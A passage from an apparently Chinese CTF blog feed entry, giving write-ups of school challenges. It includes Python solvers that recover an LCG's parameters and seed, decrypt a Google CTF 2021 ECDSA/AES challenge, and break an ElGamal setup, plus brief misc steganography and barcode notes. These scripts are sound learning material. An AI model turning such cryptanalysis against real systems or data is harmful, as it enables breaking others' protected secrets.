class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">flag = &#x27;&#x27;.encode()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seed = bytes_to_long(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">length = seed.bit_length()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n=getPrime(length)</span></span><br><span class="line"><span class="string">a=getPrime(length)</span></span><br><span class="line"><span class="string">b=getPrime(length)</span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">    seed = (a*seed+b)%n</span></span><br><span class="line"><span class="string">    s.append(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span> </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s=[<span class="number">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class="number">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class="number">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class="number">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class="number">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class="number">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class="number">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class="number">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class="number">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class="number">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    print(long_to_bytes(plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Dear-Alice"><a href="#Dear-Alice" class="headerlink" title="Dear Alice"></a>Dear Alice</h3><p>google ctf 2021原题</p><p><a href="https://github.com/Haorical/Wargames/tree/master/google-2021/h1">https://github.com/Haorical/Wargames/tree/master/google-2021/h1</a></p><p>嫖到脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INF = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">311315114987715623444276142623839583360207853110657101019745009424926710590583360123029204556690633449715530612380512577293882572730509350735778781050933</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413552439917934304191956942765446530386427345937963894309923928536070534607816947</span></span><br><span class="line">a = <span class="number">6294860557973063227666421306476379324074715770622746227136910445450301914281276098027990968407983962691151853678563877834221834027439718238065725844264138</span></span><br><span class="line">b = <span class="number">3245789008328967059274849584342077916531909009637501918328323668736179176583263496463525128488282611559800773506973771797764811498834995234341530862286627</span></span><br><span class="line">n = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413418528378981730643524959857451398370029280583094215613882043973354392115544169</span></span><br><span class="line">G = (<span class="number">5139617820728399941653175323358137352238277428061991823713659546881441331696699723004749024403291797641521696406798421624364096550661311227399430098134141</span>,</span><br><span class="line">     <span class="number">1798860115416690485862271986832828064808333512613833729548071279524320966991708554765227095605106785724406691559310536469721469398449016850588110200884962</span>,</span><br><span class="line">     <span class="number">5042518522433577951395875294780962682755843408950010956510838422057522452845550974098236475624683438351211176927595173916071040272153903968536756498306512</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Double</span>(<span class="params">p</span>):</span></span><br><span class="line">    x, y, z = p</span><br><span class="line">    <span class="keyword">if</span> z == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> INF</span><br><span class="line">    ysqr = y * y % mod</span><br><span class="line">    zsqr = z * z % mod</span><br><span class="line">    s = <span class="number">4</span> * x * ysqr % mod</span><br><span class="line">    m = (<span class="number">3</span> * x * x + a * zsqr * zsqr) % mod</span><br><span class="line">    x2 = (m * m - <span class="number">2</span> * s) % mod</span><br><span class="line">    y2 = (m * (s - x2) - <span class="number">8</span> * ysqr * ysqr) % mod</span><br><span class="line">    z2 = <span class="number">2</span> * y * z % mod</span><br><span class="line">    <span class="keyword">return</span> x2, y2, z2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, q</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">if</span> q[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    x1, y1, z1 = p</span><br><span class="line">    x2, y2, z2 = q</span><br><span class="line">    z1sqr = z1 * z1 % mod</span><br><span class="line">    z2sqr = z2 * z2 % mod</span><br><span class="line">    u1 = x1 * z2sqr % mod</span><br><span class="line">    u2 = x2 * z1sqr % mod</span><br><span class="line">    s1 = y1 * z2 * z2sqr % mod</span><br><span class="line">    s2 = y2 * z1 * z1sqr % mod</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">if</span> s1 != s2:</span><br><span class="line">            <span class="keyword">return</span> INF</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Double(p)</span><br><span class="line">    h = u2 - u1 % mod</span><br><span class="line">    hsqr = h * h % mod</span><br><span class="line">    hcube = hsqr * h % mod</span><br><span class="line">    r = s2 - s1 % mod</span><br><span class="line">    t = u1 * hsqr % mod</span><br><span class="line">    x3 = (r * r - hcube - <span class="number">2</span> * t) % mod</span><br><span class="line">    y3 = (r * (t - x3) - s1 * hcube) % mod</span><br><span class="line">    z3 = h * z1 * z2 % mod</span><br><span class="line">    <span class="keyword">return</span> x3, y3, z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == INF:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    res = INF</span><br><span class="line">    <span class="keyword">while</span> x:</span><br><span class="line">        x, r = <span class="built_in">divmod</span>(x, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            res = Add(res, p)</span><br><span class="line">        p = Double(p)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Transform</span>(<span class="params">m, l</span>):</span></span><br><span class="line">    z = m</span><br><span class="line">    shift = l - n.bit_length()</span><br><span class="line">    <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">        z &gt;&gt;= shift</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RNG</span>(<span class="params">nbits, a, b</span>):</span></span><br><span class="line">    nbytes = nbits // <span class="number">8</span></span><br><span class="line">    B = os.urandom(nbytes)</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">sum</span>([B[i] * b ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(B))]) % <span class="number">2</span>**nbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sign</span>(<span class="params">msg, d</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">&#x27;d = &#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;z = &#x27;</span>, z)</span><br><span class="line">    k = RNG(n.bit_length(), <span class="number">16843009</span>, <span class="number">4294967296</span>)</span><br><span class="line">    print(<span class="string">&#x27;k = &#x27;</span>, k)</span><br><span class="line">    x1, y1, z1 = Multiply(G, k)</span><br><span class="line">    r = (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line">    s = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    print(<span class="string">&#x27;r = &#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s = &#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;left = &#x27;</span>, <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) % n)</span><br><span class="line">    print(<span class="string">&#x27;right = &#x27;</span>, (z + r * d) % n)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(s) == <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Verify</span>(<span class="params">msg, Q, r, s</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    u1 = z*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    u2 = r*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    x1, y1, z1 = Add(Multiply(G, u1), Multiply(Q, u2))</span><br><span class="line">    <span class="keyword">return</span> r == (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    encryptor = Cipher(aes, modes.ECB(), default_backend()).encryptor()</span><br><span class="line">    padder = padding.PKCS7(aes.block_size).padder()</span><br><span class="line">    padded_data = padder.update(plaintext) + padder.finalize()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    decryptor = Cipher(aes, modes.ECB(), default_backend()).decryptor()</span><br><span class="line">    unpadder = padding.PKCS7(aes.block_size).unpadder()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    plaintext = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">_, _, ca = (<span class="number">8832295267397231051293216564016639537146222596144354850230682204978731311879255662259663270183445827348338041752369314181111940713714991119349376636404112</span>, <span class="number">8683784208731634307361157916911868656279723101808163939313971801256736484458199874570532609285522391139002296248059424750941962344918156540408403221858292</span>, <span class="number">105398535464409171419472607677747462033030589690350997911381059472020486557672504778060748058626707326992258591478040500759349352824508941100030623708235493999018571171774658661651532338275358740821547158517615704187173346885098836066743736788259192831313414309775979590033581301910426314601982482556670097620</span>)</span><br><span class="line"></span><br><span class="line">ka = [</span><br><span class="line">    <span class="number">0x8a6e81a10c229af504772b51c502638820811034faa62b8dafa019210347918419b71d0638c89b59026b7611edc6a14b2c1c1fb1092a352adfffb7e114f4f385</span>,</span><br><span class="line">    <span class="number">0x3f837315a1fb46097f5eb680697901d75758b859846d37cad33d3f464efb84ace1e85fc60f4e445a031b5ca0e4965e0b081bd4a6e8efea1d3ba07aad51a70cd</span></span><br><span class="line">]</span><br><span class="line">ca = ca.to_bytes(byteorder=<span class="string">&#x27;big&#x27;</span>,length=(ca.bit_length() + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ka:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recv_msg = Decrypt(ca, k)</span><br><span class="line">        print(recv_msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">g, h, A, B, p, q = <span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">c1, c2 = <span class="built_in">eval</span>(data[<span class="number">1</span>])</span><br><span class="line">c1_, c2_ = <span class="built_in">eval</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)</span><br><span class="line">tmp = tmp % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;t=&#x27;</span>, tmp</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A=&#x27;</span>, A</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;p=&#x27;</span>, p</span><br><span class="line">gg, x, y = gmpy2.gcdext(A - <span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> gg</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(tmp, x, p)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p>base32解码</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>zsteg直接出</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E5%9B%BE%E7%89%8720211007231453.png"></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>百度识图，福尔摩斯，搜索发现跳舞的小人</p><p>发现提示信息<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>密码文件虽然空白但是占用空间很大，用上面的工具</p><p>最后16进制转字符串得到flag</p><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>扫描机票上的条形码即可，属于pdf417，m1后面就是姓名</p><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;震惊！平平无奇的web手，竟然把crypto ak了，顺带做了2个re和几个misc。。。&lt;/p&gt;
&lt;p&gt;校赛感觉难度一般，就是给入门的做了，暑假学的好多都用上了，感觉不错。不过持续时间太长了，直接7天，而且国庆那几天贼忙，部门、工作室、新生······时间不是很合理，最后几天直接摆烂了，一个题也没做。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf学习" scheme="http://blog.haorical.top/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
  </entry>
  
</feed>
